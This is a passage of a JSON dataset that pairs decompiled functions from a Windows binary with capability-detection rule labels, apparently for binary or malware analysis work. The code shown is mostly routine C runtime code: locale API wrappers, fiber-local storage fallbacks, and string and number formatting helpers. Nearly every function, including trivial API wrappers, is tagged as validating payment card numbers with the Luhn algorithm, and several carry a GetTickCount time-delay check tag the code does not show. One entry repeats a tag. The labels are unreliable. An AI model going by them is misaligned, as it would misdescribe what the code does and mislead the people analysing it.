        "decompiled_code": "\nuint __cdecl fcn.004133ae(uint arg_8h)\n\n{\n    uint uVar1;\n    uint var_2ch;\n    \n    fcn.0040b513(0);\n    uVar1 = fcn.00412da4(&var_2ch, arg_8h, 0, 10, 1);\n    fcn.0040b55b();\n    return uVar1;\n}\n",
        "token_count": 91
    },
    "0041419e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nfloat10 __cdecl\nfcn.0041419e(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h, uint arg_28h)\n\n{\n    int32_t iVar1;\n    uint var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = 0;\n    do {\n        if (*(iVar1 * 8 + 0x427a48) == arg_ch) {\n            var_1ch = *(iVar1 * 8 + 0x427a4c);\n            if (var_1ch != 0) {\n                var_18h = arg_10h;\n                var_14h = arg_14h;\n                var_10h = arg_18h;\n                var_ch = arg_1ch;\n                var_8h = arg_20h;\n                var_20h = arg_8h;\n                var_4h = arg_24h;\n                fcn.0041442c(arg_28h, 0xffff);\n                iVar1 = fcn.0041069c(&var_20h);\n                if (iVar1 == 0) {\n                    fcn.0041416f(arg_8h);\n                }\n                return CONCAT44(var_4h, var_8h);\n            }\n            goto code_r0x004141be;\n        }\n        iVar1 = iVar1 + 1;\n    } while (iVar1 < 0x1d);\n    var_1ch = 0;\ncode_r0x004141be:\n    fcn.0041442c(arg_28h, 0xffff);\n    fcn.0041416f(arg_8h);\n    return CONCAT44(arg_24h, arg_20h);\n}\n",
        "token_count": 444
    },
    "00414a91": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00414a91(uint *arg_8h, uchar *arg_ch, int32_t arg_10h, uint arg_14h, uint arg_18h, int32_t arg_1ch, uint arg_20h, \n            uint arg_24h, uint arg_28h, uint arg_2ch)\n\n{\n    uint arg_18h_00;\n    int32_t iVar1;\n    int32_t var_ch;\n    \n    arg_18h_00 = fcn.0041ef4b(*arg_8h, arg_8h[1], arg_1ch + 1, 1, &var_ch, arg_14h, arg_18h);\n    iVar1 = -1;\n    if (arg_10h != -1) {\n        iVar1 = (arg_10h - (var_ch == 0x2d)) - (0 < arg_1ch);\n    }\n    iVar1 = fcn.0041ee51(arg_ch + (0 < arg_1ch) + (var_ch == 0x2d), iVar1, arg_1ch + 1, &var_ch, arg_18h_00, arg_28h, \n                         arg_2ch);\n    if (iVar1 == 0) {\n        fcn.00414b35(arg_ch, arg_10h, arg_1ch, arg_20h, arg_24h, &var_ch, 0, arg_2ch);\n    }\n    else {\n        *arg_ch = 0;\n    }\n    return;\n}\n",
        "token_count": 345
    },
    "00414c7a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00414c7a(uint *arg_8h, uchar *arg_ch, int32_t arg_10h, uint arg_14h, uint arg_18h, int32_t arg_1ch, uint arg_20h, \n            uint arg_24h)\n\n{\n    uint arg_18h_00;\n    int32_t iVar1;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint uStack8;\n    \n    var_ch = 0;\n    var_8h = 0;\n    uStack8 = 0;\n    arg_18h_00 = fcn.0041ef4b(*arg_8h, arg_8h[1], arg_1ch, 0, &var_ch, arg_14h, arg_18h);\n    iVar1 = -1;\n    if (arg_10h != -1) {\n        iVar1 = arg_10h - (var_ch == 0x2d);\n    }\n    iVar1 = fcn.0041ee51(arg_ch + (var_ch == 0x2d), iVar1, var_8h + arg_1ch, &var_ch, arg_18h_00, arg_20h, arg_24h);\n    if (iVar1 == 0) {\n        fcn.00414d10(arg_ch, arg_10h, arg_1ch, &var_ch, 0, arg_24h);\n    }\n    else {\n        *arg_ch = 0;\n    }\n    return;\n}\n",
        "token_count": 341
    },
    "00414dfe": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00414dfe(uint *arg_8h, uchar *arg_ch, int32_t arg_10h, uint arg_14h, uint arg_18h, int32_t arg_1ch, uint arg_20h, \n            uint arg_24h, uint arg_28h, uint arg_2ch)\n\n{\n    char *pcVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    bool bVar4;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint uStack16;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_14h = 0;\n    var_10h = 0;\n    uStack16 = 0;\n    var_4h = fcn.0041ef4b(*arg_8h, arg_8h[1], arg_1ch, 0, &var_14h, arg_14h, arg_18h);\n    bVar4 = var_14h == 0x2d;\n    var_8h = var_10h + -1;\n    iVar2 = -1;\n    if (arg_10h != -1) {\n        iVar2 = arg_10h - bVar4;\n    }\n    iVar2 = fcn.0041ee51(arg_ch + bVar4, iVar2, arg_1ch, &var_14h, var_4h, arg_28h, arg_2ch);\n    if (iVar2 == 0) {\n        iVar2 = var_10h + -1;\n        if ((iVar2 < -4) || (arg_1ch <= iVar2)) {\n            fcn.00414b35(arg_ch, arg_10h, arg_1ch, arg_20h, arg_24h, &var_14h, 1, arg_2ch);\n        }\n        else {\n            pcVar1 = arg_ch + bVar4;\n            if (var_8h < iVar2) {\n                do {\n                    pcVar3 = pcVar1;\n                    pcVar1 = pcVar3 + 1;\n                } while (*pcVar3 != '\\0');\n                pcVar3[-1] = '\\0';\n            }\n            fcn.00414d10(arg_ch, arg_10h, arg_1ch, &var_14h, 1, arg_2ch);\n        }\n    }\n    else {\n        *arg_ch = 0;\n    }\n    return;\n}\n",
        "token_count": 554
    },
    "00415852": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00415852(void)\n\n{\n    fcn.00415a3b(0, \"AreFileApisANSI\", 0x428164, \"AreFileApisANSI\");\n    return;\n}\n",
        "token_count": 47
    },
    "0041586c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041586c(void)\n\n{\n    fcn.00415a3b(1, \"CompareStringEx\", 0x428178, \"CompareStringEx\");\n    return;\n}\n",
        "token_count": 44
    },
    "00415886": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00415886(void)\n\n{\n    fcn.00415a3b(2, \"EnumSystemLocalesEx\", 0x428190, \"EnumSystemLocalesEx\");\n    return;\n}\n",
        "token_count": 47
    },
    "004158a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004158a0(void)\n\n{\n    fcn.00415a3b(4, \"GetDateFormatEx\", 0x4281ac, \"GetDateFormatEx\");\n    return;\n}\n",
        "token_count": 45
    },
    "004158ba": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004158ba(void)\n\n{\n    fcn.00415a3b(7, \"GetLocaleInfoEx\", 0x4281c4, \"GetLocaleInfoEx\");\n    return;\n}\n",
        "token_count": 47
    },
    "004158d4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004158d4(void)\n\n{\n    fcn.00415a3b(10, \"GetTimeFormatEx\", 0x4281dc, \"GetTimeFormatEx\");\n    return;\n}\n",
        "token_count": 47
    },
    "004158ee": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004158ee(void)\n\n{\n    fcn.00415a3b(0xb, \"GetUserDefaultLocaleName\", 0x4281f4, \"GetUserDefaultLocaleName\");\n    return;\n}\n",
        "token_count": 50
    },
    "00415908": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00415908(void)\n\n{\n    fcn.00415a3b(0xf, \"IsValidLocaleName\", 0x428220, \"IsValidLocaleName\");\n    return;\n}\n",
        "token_count": 44
    },
    "00415922": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00415922(void)\n\n{\n    fcn.00415a3b(0x11, \"LCIDToLocaleName\", 0x428254, \"LCIDToLocaleName\");\n    return;\n}\n",
        "token_count": 49
    },
    "0041593c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041593c(void)\n\n{\n    fcn.00415a3b(0x10, 0x428244, 0x42823c, 0x428244);\n    return;\n}\n",
        "token_count": 49
    },
    "00415956": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00415956(void)\n\n{\n    fcn.00415a3b(0x12, \"LocaleNameToLCID\", 0x428270, \"LocaleNameToLCID\");\n    return;\n}\n",
        "token_count": 49
    },
    "00415abe": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00415abe(uint arg_8h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    \n    pcVar1 = fcn.00415a3b(0x18, \"AppPolicyGetProcessTerminationMethod\", 0x42828c, \"AppPolicyGetProcessTerminationMethod\"\n                         );\n    if (pcVar1 == NULL) {\n        uVar2 = 0xc0000225;\n    }\n    else {\n        (**0x424130)(0xfffffffa, arg_8h);\n        uVar2 = (*pcVar1)();\n    }\n    return uVar2;\n}\n",
        "token_count": 138
    },
    "00415bce": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "allocate thread local storage"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00415bce(uint arg_8h)\n\n{\n    code *pcVar1;\n    \n    pcVar1 = fcn.00415a3b(0x1e, \"FlsAlloc\", 0x4282b8, 0x4282c0);\n    if (pcVar1 == NULL) {\n        (*_sym.imp.KERNEL32.dll_TlsAlloc)();\n    }\n    else {\n        (**0x424130)(arg_8h);\n        (*pcVar1)();\n    }\n    return;\n}\n",
        "token_count": 118
    },
    "00415c0d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00415c0d(uint arg_8h)\n\n{\n    code *pcVar1;\n    \n    pcVar1 = fcn.00415a3b(0x1f, \"FlsFree\", 0x4282c0, 0x4282c8);\n    if (pcVar1 != NULL) {\n        (**0x424130)(arg_8h);\n        (*pcVar1)();\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x00415c46. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.KERNEL32.dll_TlsFree)();\n    return;\n}\n",
        "token_count": 151
    },
    "00415c4c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get thread local storage value"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00415c4c(uint arg_8h)\n\n{\n    code *pcVar1;\n    \n    pcVar1 = fcn.00415a3b(0x20, \"FlsGetValue\", 0x4282c8, 0x4282d0);\n    if (pcVar1 != NULL) {\n        (**0x424130)(arg_8h);\n        (*pcVar1)();\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x00415c85. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.KERNEL32.dll_TlsGetValue)();\n    return;\n}\n",
        "token_count": 150
    },
    "00415d48": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00415d48(uint lpCriticalSection, uint dwSpinCount, uint arg_10h)\n\n{\n    code *pcVar1;\n    \n    pcVar1 = fcn.00415a3b(0xe, 0x425e40, 0x428218, 0x428220);\n    if (pcVar1 == NULL) {\n        (*_sym.imp.KERNEL32.dll_InitializeCriticalSectionAndSpinCount)(lpCriticalSection, dwSpinCount);\n    }\n    else {\n        (**0x424130)(lpCriticalSection, dwSpinCount, arg_10h);\n        (*pcVar1)();\n    }\n    return;\n}\n",
        "token_count": 140
    },
    "004161cf": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004161cf(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint uVar1;\n    uint var_28h;\n    \n    fcn.0040b513(0);\n    uVar1 = fcn.00415f24(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, &var_28h);\n    fcn.0040b55b();\n    return uVar1;\n}\n",
        "token_count": 122
    },
    "00416591": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00416591(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint uVar1;\n    uint var_28h;\n    \n    fcn.0040b513(arg_1ch);\n    uVar1 = fcn.0041620c(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, &var_28h);\n    fcn.0040b55b();\n    return uVar1;\n}\n",
        "token_count": 130
    },
    "00416a3a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid __cdecl\nfcn.00416a3a(int32_t *arg_8h, uint arg_ch, uint32_t arg_10h, uint arg_14h, int32_t arg_18h, uint arg_1ch, \n            int32_t arg_20h, int32_t arg_24h, int32_t arg_28h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint *lpWideCharStr;\n    int32_t iVar3;\n    uint *arg_18h_00;\n    int32_t iVar4;\n    uint *puVar5;\n    uint unaff_EDI;\n    uint var_14h;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar3 = arg_18h;\n    var_14h = unaff_EDI;\n    if (0 < arg_18h) {\n        iVar1 = fcn.0040ff0d(arg_14h, arg_18h);\n        iVar3 = iVar1 + 1;\n        if (arg_18h <= iVar1) {\n            iVar3 = iVar1;\n        }\n    }\n    if (arg_24h == 0) {\n        arg_24h = *(*arg_8h + 8);\n    }\n    iVar1 = fcn.0041a9a5(arg_24h, (arg_28h != 0) * 8 + 1, arg_14h, iVar3, 0, 0);\n    lpWideCharStr = &var_14h;\n    if (iVar1 == 0) goto code_r0x00416c16;\n    uVar2 = iVar1 * 2 + 8;\n    uVar2 = -(iVar1 * 2 < uVar2) & uVar2;\n    if (uVar2 == 0) {\n        lpWideCharStr = NULL;\n    }\n    else {\n        if (uVar2 < 0x401) {\n            fcn.00407370();\n            if (*0x10 != 0x18) {\n                var_14h = 0xcccc;\n                lpWideCharStr = &var_14h;\ncode_r0x00416ae7:\n                lpWideCharStr = lpWideCharStr + 2;\n            }\n        }\n        else {\n            lpWideCharStr = fcn.00414556(uVar2);\n            if (lpWideCharStr != NULL) {\n                *lpWideCharStr = 0xdddd;\n                goto code_r0x00416ae7;\n            }\n        }\n        if ((lpWideCharStr != NULL) &&\n           (iVar3 = fcn.0041a9a5(arg_24h, 1, arg_14h, iVar3, lpWideCharStr, iVar1),  iVar3 != 0)) {\n            puVar5 = &stack0xffffffc4;\n            arg_18h_00 = &stack0xffffffc4;\n            iVar3 = fcn.00415e0a(arg_ch, arg_10h, lpWideCharStr, iVar1, 0, 0, 0, 0, 0);\n            if (iVar3 != 0) {\n                if ((arg_10h & 0x400) == 0) {\n                    uVar2 = iVar3 * 2 + 8;\n                    uVar2 = -(iVar3 * 2 < uVar2) & uVar2;\n                    if (uVar2 == 0) {\n                        arg_18h_00 = NULL;\n                    }\n                    else if (uVar2 < 0x401) {\n                        fcn.00407370();\n                        if (*0x10 != 0x3c) {\ncode_r0x00416ba8:\n                            arg_18h_00 = puVar5 + 2;\n                            if ((arg_18h_00 != NULL) &&\n                               (iVar4 = fcn.00415e0a(arg_ch, arg_10h, lpWideCharStr, iVar1, arg_18h_00, iVar3, 0, 0, 0)\n                               ,  iVar4 != 0)) {\n                                if (arg_20h == 0) {\n                                    arg_20h = 0;\n                                    arg_1ch = 0;\n                                }\n                                iVar3 = fcn.0041aa21(arg_24h, 0, arg_18h_00, iVar3, arg_1ch, arg_20h, 0, 0);\n                                if (iVar3 != 0) {\n                                    fcn.00406c2b(arg_18h_00);\n                                    goto code_r0x00416c0d;\n                                }\n                            }\n                        }\n                    }\n                    else {\n                        arg_18h_00 = fcn.00414556(uVar2);\n                        if (arg_18h_00 != NULL) {\n                            *arg_18h_00 = 0xdddd;\n                            puVar5 = arg_18h_00;\n                            goto code_r0x00416ba8;\n                        }\n                    }\n                    fcn.00406c2b(arg_18h_00);\n                }\n                else if ((arg_20h != 0) && (iVar3 <= arg_20h)) {\n                    fcn.00415e0a(arg_ch, arg_10h, lpWideCharStr, iVar1, arg_1ch, arg_20h, 0, 0, 0);\n                }\n            }\n        }\n    }\ncode_r0x00416c0d:\n    fcn.00406c2b(lpWideCharStr);\ncode_r0x00416c16:\n    fcn.00406dcc(iVar1);\n    return;\n}\n",
        "token_count": 1272
    },
    "00417d3e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_10h\n\nulong __cdecl fcn.00417d3e(uint arg_8h, uint arg_ch)\n\n{\n    int32_t arg_1ch;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    ulong uVar1;\n    uint var_20h;\n    uint var_1ch;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00407b00(0x430fd0, 0x10);\n    if (*(unaff_EBP + 8) == 0) {\n        arg_1ch = *(unaff_EBP + 0xc);\n        *(arg_1ch + 0x1c) = 1;\n        *(arg_1ch + 0x18) = 0x16;\n        fcn.0040b7a2(0, 0, 0, 0, 0, arg_1ch);\n        uVar1 = 0xffffffffffffffff;\n    }\n    else {\n        *(unaff_EBP + -0x20) = 0;\n        *(unaff_EBP + -0x1c) = 0;\n        fcn.0040e26b(*(unaff_EBP + 8));\n        *(unaff_EBP + -4) = 0;\n        uVar1 = fcn.00417dcd(*(unaff_EBP + 8), *(unaff_EBP + 0xc));\n        *(unaff_EBP + -0x20) = uVar1;\n        *(unaff_EBP + -0x1c) = uVar1 >> 0x20;\n        *(unaff_EBP + -4) = 0xfffffffe;\n        fcn.00417dc3(0x430fd0);\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0x10);\n    return uVar1;\n}\n",
        "token_count": 456
    },
    "004190e4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong __cdecl fcn.004190e4(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    ulong uVar1;\n    uint var_28h;\n    \n    fcn.0040b513(0);\n    uVar1 = fcn.00418f3b(arg_8h, arg_ch, arg_10h, arg_14h, &var_28h);\n    fcn.0040b55b();\n    return uVar1;\n}\n",
        "token_count": 113
    },
    "00419124": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00419124(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    fcn.00418f3b(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n    return;\n}\n",
        "token_count": 75
    },
    "00419142": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong __cdecl fcn.00419142(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    ulong uVar1;\n    uint var_28h;\n    \n    fcn.0040b513(0);\n    uVar1 = fcn.00419061(arg_8h, arg_ch, arg_10h, arg_14h, &var_28h);\n    fcn.0040b55b();\n    return uVar1;\n}\n",
        "token_count": 110
    },
    "00419182": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00419182(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    fcn.00419061(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n    return;\n}\n",
        "token_count": 73
    },
    "0041aad8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041aad8(uint16_t *arg_8h, uint16_t *arg_ch)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    \n    do {\n        uVar1 = *arg_8h;\n        arg_8h = arg_8h + 1;\n        if (uVar1 - 0x41 < 0x1a) {\n            uVar1 = uVar1 + 0x20;\n        }\n        uVar2 = *arg_ch;\n        arg_ch = arg_ch + 1;\n        if (uVar2 - 0x41 < 0x1a) {\n            uVar2 = uVar2 + 0x20;\n        }\n    } while ((uVar1 == uVar2) && (uVar1 != 0));\n    return;\n}\n",
        "token_count": 187
    },
    "0041ae3d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0041ae3d(int16_t *arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint32_t arg_8h_00;\n    uint uVar2;\n    int32_t *piVar3;\n    \n    if (arg_8h == NULL) {\n        fcn.004100de();\n        *(arg_ch + 8) = 0;\n        *(arg_ch + 0xc) = 0;\n    }\n    else {\n        if (*arg_8h != 0) {\n            arg_8h_00 = fcn.0041aa21(arg_14h, 0, arg_8h, 0xffffffff, 0, 0, 0, 0);\n            if (arg_8h_00 == 0) {\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                fcn.0040e094(uVar2);\n                piVar3 = fcn.0040e0ee();\n                return *piVar3;\n            }\n            if ((*(arg_ch + 0xc) <= arg_8h_00 && arg_8h_00 != *(arg_ch + 0xc)) &&\n               (iVar1 = fcn.0041b3df(arg_8h_00),  iVar1 != 0)) {\n                return iVar1;\n            }\n            iVar1 = fcn.004100ba(arg_14h, arg_8h, *(arg_ch + 8), *(arg_ch + 0xc));\n            if (iVar1 == 0) {\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                fcn.0040e094(uVar2);\n                piVar3 = fcn.0040e0ee();\n                return *piVar3;\n            }\n            *(arg_ch + 0x10) = iVar1 + -1;\n            return 0;\n        }\n        if ((*(arg_ch + 0xc) == 0) && (iVar1 = fcn.0041b3df(1),  iVar1 != 0)) {\n            return iVar1;\n        }\n        **(arg_ch + 8) = 0;\n    }\n    *(arg_ch + 0x10) = 0;\n    return 0;\n}\n",
        "token_count": 517
    },
    "0041b3df": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0041b3df(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    \n    fcn.004100de();\n    iVar1 = fcn.0041015e(in_ECX + 8, arg_8h);\n    if (iVar1 == 0) {\n        *(in_ECX + 0x14) = 1;\n        iVar1 = 0;\n        *(in_ECX + 0xc) = arg_8h;\n    }\n    else {\n        *(in_ECX + 0xc) = 0;\n        *(in_ECX + 0x14) = 0;\n    }\n    return iVar1;\n}\n",
        "token_count": 158
    },
    "0041b4a2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Type propagation algorithm not settling\n\nint32_t __cdecl fcn.0041b4a2(int32_t *arg_8h, int32_t *arg_ch)\n\n{\n    char cVar1;\n    code *pcVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    char *pcVar5;\n    int32_t iVar6;\n    char **ppcVar7;\n    char **ppcVar8;\n    char **var_20h;\n    char **var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    char *var_10h;\n    char *var_ch;\n    char *var_8h;\n    char *var_4h;\n    \n    if (arg_ch == NULL) {\n        puVar3 = fcn.0040e0ee();\n        iVar6 = 0x16;\n        *puVar3 = 0x16;\n        fcn.0040b81f();\n    }\n    else {\n        *arg_ch = 0;\n        var_18h = 0;\n        var_1ch = NULL;\n        var_20h = NULL;\n        iVar6 = *arg_8h;\n        ppcVar8 = var_20h;\n        while (var_20h = ppcVar8,  iVar6 != 0) {\n            var_4h = CONCAT13(var_4h >> 0x18, 0x3f2a);\n            iVar6 = fcn.004218a0(iVar6, &var_4h);\n            if (iVar6 == 0) {\n                iVar6 = fcn.0041b080(*arg_8h, 0, 0, &var_20h);\n            }\n            else {\n                iVar6 = fcn.0041b131(*arg_8h, iVar6, &var_20h);\n            }\n            if (iVar6 != 0) goto code_r0x0041afea;\n            arg_8h = arg_8h + 1;\n            ppcVar8 = var_20h;\n            iVar6 = *arg_8h;\n        }\n        iVar6 = (var_1ch - ppcVar8 >> 2) + 1;\n        var_8h = NULL;\n        for (ppcVar7 = ppcVar8; ppcVar7 != var_1ch; ppcVar7 = ppcVar7 + 1) {\n            pcVar5 = *ppcVar7;\n            var_ch = pcVar5 + 1;\n            do {\n                cVar1 = *pcVar5;\n                pcVar5 = pcVar5 + 1;\n            } while (cVar1 != '\\0');\n            var_8h = pcVar5 + var_8h + (1 - var_ch);\n        }\n        iVar4 = fcn.00410994(iVar6, var_8h, 1);\n        ppcVar7 = var_1ch;\n        if (iVar4 == 0) {\n            fcn.0041451c(0);\n            iVar6 = -1;\ncode_r0x0041afea:\n            fcn.0041b3b6();\n        }\n        else {\n            var_4h = iVar4 + iVar6 * 4;\n            var_10h = var_4h;\n            if (ppcVar8 != var_1ch) {\n                var_14h = iVar4 - ppcVar8;\n                do {\n                    var_ch = *ppcVar8;\n                    pcVar5 = var_ch + 1;\n                    do {\n                        cVar1 = *var_ch;\n                        var_ch = var_ch + 1;\n                    } while (cVar1 != '\\0');\n                    var_ch = var_ch + (1 - pcVar5);\n                    iVar6 = fcn.004209e3(var_4h, var_8h + (var_10h - var_4h), *ppcVar8, var_ch);\n                    if (iVar6 != 0) {\n                        fcn.0040b84c(0, 0, 0, 0, 0);\n                        pcVar2 = swi(3);\n                        iVar6 = (*pcVar2)();\n                        return iVar6;\n                    }\n                    *(var_14h + ppcVar8) = var_4h;\n                    ppcVar8 = ppcVar8 + 1;\n                    var_4h = var_4h + var_ch;\n                } while (ppcVar8 != ppcVar7);\n            }\n            *arg_ch = iVar4;\n            fcn.0041451c(0);\n            fcn.0041b3b6();\n            iVar6 = 0;\n        }\n    }\n    return iVar6;\n}\n",
        "token_count": 1038
    },
    "0041b6cd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041b6cd(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = 0;\n    fcn.004085e0(arg_8h + 0x18, 0, 0x101);\n    *(arg_8h + 4) = 0;\n    *(arg_8h + 8) = 0;\n    *(arg_8h + 0x21c) = 0;\n    *(arg_8h + 0xc) = 0;\n    iVar1 = 0;\n    *(arg_8h + 0x10) = 0;\n    *(arg_8h + 0x14) = 0;\n    do {\n        *(arg_8h + 0x18 + iVar1) = *(iVar1 + 0x48e778);\n        iVar1 = iVar1 + 1;\n    } while (iVar1 < 0x101);\n    do {\n        *(arg_8h + 0x119 + iVar2) = *(iVar2 + 0x48e879);\n        iVar2 = iVar2 + 1;\n    } while (iVar2 < 0x100);\n    return;\n}\n",
        "token_count": 276
    },
    "0041bdd3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
